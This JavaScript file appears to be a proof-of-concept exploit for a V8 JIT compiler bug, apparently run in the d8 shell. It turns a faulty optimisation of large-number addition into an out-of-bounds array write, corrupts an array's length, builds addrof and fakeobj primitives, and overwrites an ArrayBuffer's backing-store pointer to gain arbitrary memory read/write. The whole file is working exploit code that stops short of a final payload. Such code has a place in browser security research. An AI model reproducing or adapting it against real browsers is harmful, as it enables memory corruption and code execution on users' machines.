var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function f2i(val) {
	f64_buf[0] = val;
	return u64_buf[0];
}

function i2f(val) {
	u64_buf[0] = BigInt(val);
	return f64_buf[0];
}

let hexp = (i) => {
  print("0x" + (i).toString(16).padStart(16,"0"));
}

let MAGIC = 1.1;


function opt_me(bruh) {
	let arr = [MAGIC, MAGIC, MAGIC];
	// This is not gonna work
	//let arr2 = new Array(1.2, 1.2); 
	let arr2 = Array.of(1.2);
	let ab = new ArrayBuffer(1025);
	let dv = new DataView(ab);
	fake_arr = [0x1336, {a: 0x41414141}, 0x1337];
	victim_idx = -1;

	let c = bruh ? 9007199254740992 : 9007199254740988;
	let z = c + 1 + 1 + 1;
	// 9007199254740992 + 1 + 1 : 9007199254740988 + 1 + 1
	// reduced to: 9007199254740992 + 2 : 9007199254740988 + 2
	// correct: 9007199254740992 : 9007199254740990
	// incorrect: 9007199254740994 : 9007199254740990
	z = z - 9007199254740990;

	let leak = arr[z];
	// Change arr2 JSArray length to 0x400
	// Prepare for fakeobj and abitrary read/write
	arr[z] = i2f(0x0000040000000000);

	if (leak != MAGIC) {
		if (arr2.length != 0x400) {
			print("Could not corrupt arr2 length for OOB");
			return 0;
		}

		let victim_idx = arr2.indexOf(i2f(0x133600000000));

		if (victim_idx == -1 || f2i(arr2[victim_idx + 2]) != 0x133700000000) {
			print("Could not locate fake object array after arr2");
			return 0;
		}

		victim_idx += 1;

		function addrof(obj) {
			fake_arr[1] = obj;
			return f2i(arr2[victim_idx]);
		}

		function fakeobj(addr) {
			arr2[victim_idx] = i2f(addr);
			return fake_arr[1];
		}

		// Arbitrary read/write by changing ArrayBuffer backing_store pointer

		let ab_length_idx = arr2.indexOf(i2f(0x401));
		ab_length_idx += 1;
		arr2[ab_length_idx] = i2f(0x414141424242);
		
		//Gonna SIGSEV here dv.getUint32(0);
		
		readline();
	}
}

opt_me(false);
%OptimizeFunctionOnNextCall(opt_me);
opt_me(true);
